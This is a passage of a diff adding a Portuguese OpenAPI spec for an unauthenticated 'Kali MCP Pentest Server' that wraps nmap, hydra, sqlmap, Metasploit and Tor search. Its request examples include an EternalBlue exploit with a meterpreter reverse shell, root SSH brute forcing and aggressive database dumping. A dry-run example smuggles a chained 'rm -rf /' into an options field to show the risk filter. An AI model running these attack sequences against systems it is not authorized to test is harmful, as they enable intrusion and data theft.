@@ -1,0 +1,1373 @@
+{
+  "openapi": "3.0.3",
+  "info": {
+    "title": "Kali MCP Pentest Server API",
+    "description": "API RESTful para automação de ferramentas de penetration testing via MCP (Model Context Protocol). Controla 100+ ferramentas de segurança do Kali Linux.\n\n## Autenticação\nAtualmente sem autenticação (uso interno em container Docker).\n\n## Rate Limiting\n120 requests/60s por IP:path.\n\n## Notas de Segurança\n- Apenas para uso em ambientes autorizados\n- Comandos passam por filtro de risco antes da execução\n- Todos os resultados são persistidos em /root/reports/",
+    "version": "1.0.0",
+    "contact": {
+      "name": "Thierry Braga"
+    },
+    "license": {
+      "name": "MIT"
+    }
+  },
+  "servers": [
+    {
+      "url": "http://localhost:3000",
+      "description": "MCP Server local (Docker)"
+    }
+  ],
+  "tags": [
+    { "name": "health", "description": "Status do servidor" },
+    { "name": "scanning", "description": "Varredura de portas e hosts" },
+    { "name": "bruteforce", "description": "Ataques de força bruta e cracking" },
+    { "name": "recon", "description": "Reconhecimento e OSINT" },
+    { "name": "web", "description": "Testes de aplicações web" },
+    { "name": "exploit", "description": "Exploração e pós-exploração" },
+    { "name": "tools", "description": "Execução genérica de ferramentas" },
+    { "name": "skills", "description": "Documentação de skills/ferramentas" },
+    { "name": "reports", "description": "Relatórios e artefatos" },
+    { "name": "onion", "description": "Pesquisa via rede Tor (.onion)" }
+  ],
+  "paths": {
+    "/": {
+      "get": {
+        "tags": ["health"],
+        "summary": "Informações do servidor",
+        "description": "Retorna nome, versão e lista de endpoints disponíveis.",
+        "operationId": "getRoot",
+        "responses": {
+          "200": {
+            "description": "Informações do servidor",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ServerInfo" }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/health": {
+      "get": {
+        "tags": ["health"],
+        "summary": "Health check",
+        "description": "Verifica se o servidor está em execução.",
+        "operationId": "getHealth",
+        "responses": {
+          "200": {
+            "description": "Servidor saudável",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "status": { "type": "string", "example": "healthy" },
+                    "timestamp": { "type": "string", "format": "date-time" }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/scan/nmap": {
+      "post": {
+        "tags": ["scanning"],
+        "summary": "Varredura com nmap",
+        "description": "Executa varredura de portas e detecção de serviços com nmap. Salva resultados em .txt e .xml.",
+        "operationId": "runNmap",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/NmapRequest" },
+              "examples": {
+                "quick": {
+                  "summary": "Scan rápido de host discovery",
+                  "value": { "target": "192.168.1.0/24", "options": "-sn" }
+                },
+                "service_detection": {
+                  "summary": "Detecção de serviços top 1000 portas",
+                  "value": { "target": "10.10.10.5", "options": "-sV -sC --top-ports 1000 -T4", "output": "xml" }
+                },
+                "full_vuln": {
+                  "summary": "Scan completo com scripts de vulnerabilidade",
+                  "value": { "target": "192.168.1.50", "options": "-sV -sC -O -p- --script vuln -T4", "output": "xml" }
+                },
+                "stealth": {
+                  "summary": "Scan furtivo baixo ruído",
+                  "value": { "target": "10.0.0.1", "options": "-sS -T2 -Pn --data-length 15", "output": "grepable" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "429": { "$ref": "#/components/responses/RateLimited" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/scan/masscan": {
+      "post": {
+        "tags": ["scanning"],
+        "summary": "Varredura rápida com masscan",
+        "description": "Varredura ultrarrápida de portas (milhões de pacotes/s). Ideal para descoberta inicial em redes grandes.",
+        "operationId": "runMasscan",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/MasscanRequest" },
+              "examples": {
+                "full_ports": {
+                  "summary": "Todas as portas em rede /24",
+                  "value": { "target": "192.168.1.0/24", "ports": "1-65535", "rate": "1000" }
+                },
+                "web_only": {
+                  "summary": "Apenas portas web",
+                  "value": { "target": "10.0.0.1", "ports": "80,443,8080,8443", "rate": "5000" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/bruteforce/hydra": {
+      "post": {
+        "tags": ["bruteforce"],
+        "summary": "Força bruta com Hydra",
+        "description": "Executa ataque de força bruta em serviços de rede. Suporta SSH, FTP, HTTP, RDP, MySQL e outros.",
+        "operationId": "runHydra",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/HydraRequest" },
+              "examples": {
+                "ssh_single_user": {
+                  "summary": "SSH com usuário único e wordlist",
+                  "value": { "target": "192.168.1.100", "service": "ssh", "username": "root", "passlist": "/root/wordlists/rockyou.txt" }
+                },
+                "ftp_userlist": {
+                  "summary": "FTP com lista de usuários",
+                  "value": { "target": "192.168.1.50", "service": "ftp", "userlist": "/root/wordlists/users.txt", "passlist": "/root/wordlists/rockyou.txt", "options": "-t 8" }
+                },
+                "http_form": {
+                  "summary": "Formulário HTTP POST",
+                  "value": { "target": "192.168.1.100", "service": "http-post-form", "username": "admin", "passlist": "/root/wordlists/rockyou.txt", "options": "\"/login:username=^USER^&password=^PASS^:F=incorrect\"" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/recon/amass": {
+      "post": {
+        "tags": ["recon"],
+        "summary": "Enumeração de subdomínios com Amass",
+        "description": "Mapeamento avançado de superfície de ataque. Suporta enumeração passiva e ativa, descoberta via ASN e CIDR.",
+        "operationId": "runAmass",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/DomainRequest" },
+              "examples": {
+                "passive": {
+                  "summary": "Enumeração passiva",
+                  "value": { "domain": "example.com", "options": "-passive" }
+                },
+                "active": {
+                  "summary": "Enumeração ativa completa",
+                  "value": { "domain": "example.com", "options": "-active -brute -w /root/wordlists/subdomains.txt" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/recon/subfinder": {
+      "post": {
+        "tags": ["recon"],
+        "summary": "Descoberta passiva de subdomínios com Subfinder",
+        "description": "Enumeração passiva de subdomínios via 15+ fontes de dados (DNS, APIs públicas, Certificate Transparency).",
+        "operationId": "runSubfinder",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/DomainRequest" },
+              "examples": {
+                "basic": {
+                  "summary": "Enumeração básica",
+                  "value": { "domain": "example.com" }
+                },
+                "verbose": {
+                  "summary": "Com output verboso e recursão",
+                  "value": { "domain": "example.com", "options": "-v -recursive" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/sqlmap": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Teste de SQL Injection com SQLMap",
+        "description": "Detecção e exploração automática de SQL injection. Suporta técnicas blind, error-based, union e time-based.",
+        "operationId": "runSqlmap",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/UrlRequest" },
+              "examples": {
+                "basic": {
+                  "summary": "Teste básico automático",
+                  "value": { "url": "http://target.com/page?id=1", "options": "--batch --risk=1 --level=1" }
+                },
+                "aggressive": {
+                  "summary": "Teste agressivo com dump",
+                  "value": { "url": "http://target.com/page?id=1", "options": "--batch --risk=3 --level=5 --dbs" }
+                },
+                "forms": {
+                  "summary": "Teste de formulários",
+                  "value": { "url": "http://target.com/login", "options": "--batch --forms --crawl=2" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/wpscan": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Scanner de vulnerabilidades WordPress",
+        "description": "Identifica vulnerabilidades em instalações WordPress: plugins desatualizados, temas vulneráveis, usuários expostos.",
+        "operationId": "runWpscan",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/UrlRequest" },
+              "examples": {
+                "enumerate": {
+                  "summary": "Enumerar plugins, temas e usuários",
+                  "value": { "url": "http://wordpress.target.com", "options": "--enumerate p,t,u" }
+                },
+                "aggressive": {
+                  "summary": "Scan agressivo de plugins",
+                  "value": { "url": "http://wordpress.target.com", "options": "--enumerate ap --plugins-detection aggressive" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/nikto": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Scanner de servidor web com Nikto",
+        "description": "Identifica vulnerabilidades em servidores web: arquivos perigosos, configurações incorretas, versões vulneráveis.",
+        "operationId": "runNikto",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/NiktoRequest" },
+              "examples": {
+                "http": {
+                  "summary": "Scan HTTP padrão",
+                  "value": { "host": "192.168.1.100", "port": 80, "ssl": false }
+                },
+                "https": {
+                  "summary": "Scan HTTPS",
+                  "value": { "host": "192.168.1.100", "port": 443, "ssl": true }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/dirb": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Força bruta de diretórios com dirb",
+        "description": "Descoberta de diretórios e arquivos ocultos por força bruta com wordlist.",
+        "operationId": "runDirb",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/DirbRequest" },
+              "examples": {
+                "common": {
+                  "summary": "Wordlist comum",
+                  "value": { "url": "http://target.com", "wordlist": "/usr/share/wordlists/dirb/common.txt" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/gobuster": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Força bruta de URI/DNS com gobuster",
+        "description": "Brute force de diretórios, DNS e virtual hosts. Mais rápido que dirb, suporte a múltiplos modos.",
+        "operationId": "runGobuster",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/GobusterRequest" },
+              "examples": {
+                "dir_mode": {
+                  "summary": "Modo diretório",
+                  "value": { "url": "http://target.com", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "extensions": "php,html,txt" }
+                },
+                "dns_mode": {
+                  "summary": "Modo DNS (subdomínios)",
+                  "value": { "url": "example.com", "mode": "dns", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/httpx": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Probe HTTP com httpx",
+        "description": "Toolkit de probe HTTP: verifica hosts ativos, status codes, tecnologias, títulos e redirecionamentos.",
+        "operationId": "runHttpx",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/TargetRequest" },
+              "examples": {
+                "probe": {
+                  "summary": "Probe básico",
+                  "value": { "target": "example.com", "options": "-title -tech-detect -status-code" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/nuclei": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Scanner de vulnerabilidades com Nuclei",
+        "description": "Scanner baseado em templates para detecção de CVEs, misconfigs e exposições. Mais de 9000 templates disponíveis.",
+        "operationId": "runNuclei",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/TargetRequest" },
+              "examples": {
+                "cves": {
+                  "summary": "Scan de CVEs",
+                  "value": { "target": "http://target.com", "options": "-t cves/ -severity critical,high" }
+                },
+                "misconfig": {
+                  "summary": "Scan de misconfigurações",
+                  "value": { "target": "http://target.com", "options": "-t misconfiguration/ -t exposures/" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/ffuf": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Fuzzing web com ffuf",
+        "description": "Fast web fuzzer para descoberta de conteúdo, parâmetros e autenticação. Suporta FUZZ em qualquer parte da requisição.",
+        "operationId": "runFfuf",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/FfufRequest" },
+              "examples": {
+                "directory": {
+                  "summary": "Descoberta de diretórios",
+                  "value": { "url": "http://target.com/FUZZ", "wordlist": "/usr/share/wordlists/dirb/common.txt" }
+                },
+                "parameter": {
+                  "summary": "Fuzzing de parâmetros",
+                  "value": { "url": "http://target.com/page?FUZZ=test", "wordlist": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt", "options": "-fc 404" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/feroxbuster": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Descoberta recursiva de conteúdo com feroxbuster",
+        "description": "Scanner recursivo de diretórios e arquivos. Detecta automaticamente subdiretórios e explora recursivamente.",
+        "operationId": "runFeroxbuster",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/UrlOptionsRequest" },
+              "examples": {
+                "recursive": {
+                  "summary": "Scan recursivo",
+                  "value": { "url": "http://target.com", "options": "-x php,html,txt --depth 3" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/web/dirsearch": {
+      "post": {
+        "tags": ["web"],
+        "summary": "Descoberta de paths web com dirsearch",
+        "description": "Ferramenta de descoberta de caminhos web com wordlists integradas e suporte a extensões.",
+        "operationId": "runDirsearch",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/UrlOptionsRequest" },
+              "examples": {
+                "basic": {
+                  "summary": "Scan básico",
+                  "value": { "url": "http://target.com", "options": "-e php,html,js,txt" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/exploit/msfconsole": {
+      "post": {
+        "tags": ["exploit"],
+        "summary": "Execução de comandos no Metasploit",
+        "description": "Executa uma sequência de comandos no msfconsole via arquivo .rc. Permite automação completa de exploração.",
+        "operationId": "runMsfconsole",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/MsfconsoleRequest" },
+              "examples": {
+                "ms17_010": {
+                  "summary": "EternalBlue (MS17-010)",
+                  "value": {
+                    "commands": [
+                      "use exploit/windows/smb/ms17_010_eternalblue",
+                      "set RHOSTS 192.168.1.100",
+                      "set LHOST 192.168.1.50",
+                      "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+                      "run",
+                      "exit"
+                    ]
+                  }
+                },
+                "db_scan": {
+                  "summary": "Scanner de banco de dados",
+                  "value": {
+                    "commands": [
+                      "use auxiliary/scanner/portscan/tcp",
+                      "set RHOSTS 192.168.1.0/24",
+                      "set PORTS 22,80,443,8080",
+                      "run",
+                      "exit"
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/tools/run": {
+      "post": {
+        "tags": ["tools"],
+        "summary": "Execução genérica de ferramenta",
+        "description": "Executa qualquer ferramenta registrada no toolRunner. Aceita parâmetros dinâmicos de target e options. Suporta streaming via SSE.",
+        "operationId": "runTool",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/ToolRunRequest" },
+              "examples": {
+                "whatweb": {
+                  "summary": "Fingerprint de tecnologias web",
+                  "value": { "tool": "whatweb", "target": "http://example.com", "options": "-a 3" }
+                },
+                "dalfox": {
+                  "summary": "Scanner XSS",
+                  "value": { "tool": "dalfox", "target": "http://target.com/search?q=test", "options": "--silence" }
+                },
+                "enum4linux": {
+                  "summary": "Enumeração SMB/NetBIOS",
+                  "value": { "tool": "enum4linux", "target": "192.168.1.100", "options": "-a" }
+                },
+                "streaming": {
+                  "summary": "Com streaming SSE",
+                  "value": { "tool": "ncrack", "target": "192.168.1.100", "options": "-p ssh", "stream": true }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/tools/dry-run": {
+      "post": {
+        "tags": ["tools"],
+        "summary": "Dry-run: avaliação de risco sem execução",
+        "description": "Constrói o comando e avalia o risco sem executar. Retorna o comando que seria executado e análise de tokens bloqueados.",
+        "operationId": "dryRunTool",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/ToolRunRequest" },
+              "examples": {
+                "safe": {
+                  "summary": "Comando seguro",
+                  "value": { "tool": "whatweb", "target": "example.com", "options": "" }
+                },
+                "risky": {
+                  "summary": "Comando com tokens bloqueados (será rejeitado)",
+                  "value": { "tool": "whatweb", "target": "example.com", "options": "&& rm -rf /" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" }
+        }
+      }
+    },
+    "/api/tools/pipeline": {
+      "post": {
+        "tags": ["tools"],
+        "summary": "Pipeline multi-ferramenta",
+        "description": "Executa uma sequência ordenada de ferramentas. Cada step pode ser dry-run ou execução real. Resultados são agregados.",
+        "operationId": "runPipeline",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/PipelineRequest" },
+              "examples": {
+                "recon_pipeline": {
+                  "summary": "Pipeline de reconhecimento",
+                  "value": {
+                    "steps": [
+                      { "tool": "assetfinder", "target": "example.com", "options": "" },
+                      { "tool": "waybackurls", "target": "example.com", "options": "" },
+                      { "tool": "whatweb", "target": "http://example.com", "options": "-a 1" }
+                    ]
+                  }
+                },
+                "web_pipeline": {
+                  "summary": "Pipeline de testes web",
+                  "value": {
+                    "steps": [
+                      { "tool": "wafw00f", "target": "http://example.com", "options": "" },
+                      { "tool": "whatweb", "target": "http://example.com", "options": "" },
+                      { "tool": "dalfox", "target": "http://example.com/search?q=test", "options": "--silence", "dryRun": true }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": {
+            "description": "Resultados da pipeline",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/PipelineResponse" }
+              }
+            }
+          },
+          "400": { "$ref": "#/components/responses/BadRequest" }
+        }
+      }
+    },
+    "/api/tools/list": {
+      "get": {
+        "tags": ["tools"],
+        "summary": "Lista de ferramentas disponíveis",
+        "description": "Retorna todas as ferramentas registradas com categoria, tags, exemplos e se possui skill disponível.",
+        "operationId": "listTools",
+        "responses": {
+          "200": {
+            "description": "Lista de ferramentas",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ToolListResponse" }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/skills/list": {
+      "get": {
+        "tags": ["skills"],
+        "summary": "Lista de skills disponíveis",
+        "description": "Retorna nomes de todas as skills (arquivos SKILL.md) disponíveis no diretório de skills.",
+        "operationId": "listSkills",
+        "responses": {
+          "200": {
+            "description": "Lista de skills",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "skills": {
+                      "type": "array",
+                      "items": { "type": "string" },
+                      "example": ["amass", "dalfox", "gobuster", "nmap", "nuclei", "sqlmap"]
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/skills/{tool}": {
+      "get": {
+        "tags": ["skills"],
+        "summary": "Conteúdo de uma skill específica",
+        "description": "Retorna o conteúdo completo do SKILL.md de uma ferramenta: objetivo, endpoint, parâmetros, flags, exemplos e OPSEC.",
+        "operationId": "getSkill",
+        "parameters": [
+          {
+            "name": "tool",
+            "in": "path",
+            "required": true,
+            "description": "Nome da skill/ferramenta",
+            "schema": { "type": "string", "example": "nmap" }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Conteúdo da skill",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/SkillResponse" }
+              }
+            }
+          },
+          "404": { "$ref": "#/components/responses/NotFound" }
+        }
+      }
+    },
+    "/api/onion/search": {
+      "post": {
+        "tags": ["onion"],
+        "summary": "Pesquisa via rede Tor (.onion)",
+        "description": "Busca e acessa páginas .onion via DuckDuckGo onion ou wordlist de URLs. Inicia Tor automaticamente se necessário.",
+        "operationId": "onionSearch",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/OnionSearchRequest" },
+              "examples": {
+                "search": {
+                  "summary": "Busca via DuckDuckGo onion",
+                  "value": { "query": "security research", "maxResults": 5 }
+                },
+                "wordlist": {
+                  "summary": "Acessar URLs de wordlist",
+                  "value": { "wordlist": ["http://exampleonionaddress.onion"], "maxPages": 3 }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": {
+            "description": "Resultados da pesquisa onion",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/OnionSearchResponse" }
+              }
+            }
+          },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api/reports": {
+      "get": {
+        "tags": ["reports"],
+        "summary": "Lista relatórios gerados",
+        "description": "Lista todos os arquivos de relatório em /root/reports/ com metadata.",
+        "operationId": "listReports",
+        "responses": {
+          "200": {
+            "description": "Lista de relatórios",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ReportsListResponse" }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/reports/summary/{filename}": {
+      "get": {
+        "tags": ["reports"],
+        "summary": "Sumário de relatório (primeiros 4000 chars)",
+        "operationId": "getReportSummary",
+        "parameters": [
+          {
+            "name": "filename",
+            "in": "path",
+            "required": true,
+            "schema": { "type": "string" },
+            "example": "nmap_192_168_1_100_2024-01-01T00-00-00-000Z.txt"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Sumário do relatório",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ReportSummaryResponse" }
+              }
+            }
+          },
+          "404": { "$ref": "#/components/responses/NotFound" }
+        }
+      }
+    },
+    "/api/reports/{filename}": {
+      "get": {
+        "tags": ["reports"],
+        "summary": "Conteúdo completo de relatório",
+        "operationId": "getReport",
+        "parameters": [
+          {
+            "name": "filename",
+            "in": "path",
+            "required": true,
+            "schema": { "type": "string" }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Conteúdo completo do relatório",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ReportContentResponse" }
+              }
+            }
+          },
+          "404": { "$ref": "#/components/responses/NotFound" }
+        }
+      }
+    },
+    "/api/web/nosqlmap": {
+      "post": {
+        "tags": ["web"],
+        "summary": "NoSQL Injection com nosqlmap",
+        "description": "Detecta e explora vulnerabilidades de NoSQL injection em aplicações que usam MongoDB, CouchDB e Redis. Suporta técnicas timing-based, boolean-based, error-based e JavaScript injection.",
+        "operationId": "runNosqlmap",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": { "$ref": "#/components/schemas/UrlRequest" },
+              "examples": {
+                "boolean_based": {
+                  "summary": "Injeção boolean-based",
+                  "value": { "url": "http://target.com/api/login", "options": "--attack 2 --httpMethod POST --postData 'user=admin&pass=test'" }
+                },
+                "timing_based": {
+                  "summary": "Injeção timing-based",
+                  "value": { "url": "http://target.com/search?q=test", "options": "--attack 1 -v" }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": { "$ref": "#/components/responses/ToolSuccess" },
+          "400": { "$ref": "#/components/responses/BadRequest" },
+          "500": { "$ref": "#/components/responses/ToolError" }
+        }
+      }
+    },
+    "/api-docs": {
+      "get": {
+        "tags": ["health"],
+        "summary": "Swagger UI - Documentação interativa da API",
+        "description": "Interface web Swagger UI para explorar e testar todos os endpoints da API.",
+        "operationId": "getApiDocs",
+        "responses": {
+          "200": {
+            "description": "Página HTML do Swagger UI",
+            "content": { "text/html": { "schema": { "type": "string" } } }
+          }
+        }
+      }
+    },
+    "/swagger.json": {
+      "get": {
+        "tags": ["health"],
+        "summary": "OpenAPI 3.0 spec (JSON)",
+        "description": "Especificação OpenAPI 3.0 em formato JSON. Pode ser importada em Postman, Insomnia ou qualquer cliente compatível.",
+        "operationId": "getSwaggerJson",
+        "responses": {
+          "200": {
+            "description": "OpenAPI spec JSON",
+            "content": { "application/json": { "schema": { "type": "object" } } }
+          }
+        }
+      }
+    },
+    "/api/artifacts": {
+      "get": {
+        "tags": ["reports"],
+        "summary": "Lista artefatos indexados",
+        "description": "Retorna todos os artefatos registrados com suporte a filtros por tool, target e type.",
+        "operationId": "listArtifacts",
+        "parameters": [
+          { "name": "tool", "in": "query", "schema": { "type": "string" }, "description": "Filtrar por nome da ferramenta" },
+          { "name": "target", "in": "query", "schema": { "type": "string" }, "description": "Filtrar por alvo" },
+          { "name": "type", "in": "query", "schema": { "type": "string", "enum": ["report", "output"] }, "description": "Filtrar por tipo" }
+        ],
+        "responses": {
+          "200": {
+            "description": "Lista de artefatos",
+            "content": {
+              "application/json": {
+                "schema": { "$ref": "#/components/schemas/ArtifactsResponse" }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "ServerInfo": {
+        "type": "object",
+        "properties": {
+          "name": { "type": "string", "example": "Kali MCP Pentest Server" },
+          "version": { "type": "string", "example": "1.0.0" },
+          "endpoints": { "type": "object" }
+        }
+      },
+      "NmapRequest": {
+        "type": "object",
+        "required": ["target"],
+        "properties": {
+          "target": {
+            "type": "string",
+            "description": "IP, range CIDR ou hostname alvo",
+            "example": "192.168.1.100"
+          },
+          "options": {
+            "type": "string",
+            "description": "Flags adicionais do CLI nmap",
+            "default": "-sV -sC",
+            "example": "-sV -sC --top-ports 1000 -T4"
+          },
+          "output": {
+            "type": "string",
+            "description": "Formato de output",
+            "enum": ["normal", "xml", "grepable", "json"],
+            "default": "normal"
+          }
+        }
+      },
+      "MasscanRequest": {
+        "type": "object",
+        "required": ["target"],
+        "properties": {
+          "target": { "type": "string", "example": "192.168.1.0/24" },
+          "ports": { "type": "string", "default": "1-65535", "example": "1-65535" },
+          "rate": { "type": "string", "default": "1000", "example": "1000" }
+        }
+      },
+      "HydraRequest": {
+        "type": "object",
+        "required": ["target", "service"],
+        "properties": {
+          "target": { "type": "string", "example": "192.168.1.100" },
+          "service": {
+            "type": "string",
+            "description": "Serviço alvo",
+            "example": "ssh",
+            "enum": ["ssh", "ftp", "telnet", "http-get", "http-post-form", "mysql", "postgres", "mssql", "rdp", "vnc", "smtp", "pop3", "imap"]
+          },
+          "username": { "type": "string", "description": "Usuário único", "example": "root" },
+          "userlist": { "type": "string", "description": "Caminho para lista de usuários", "example": "/root/wordlists/users.txt" },
+          "password": { "type": "string", "description": "Senha única" },
+          "passlist": { "type": "string", "description": "Caminho para wordlist de senhas", "default": "/root/wordlists/rockyou.txt" },
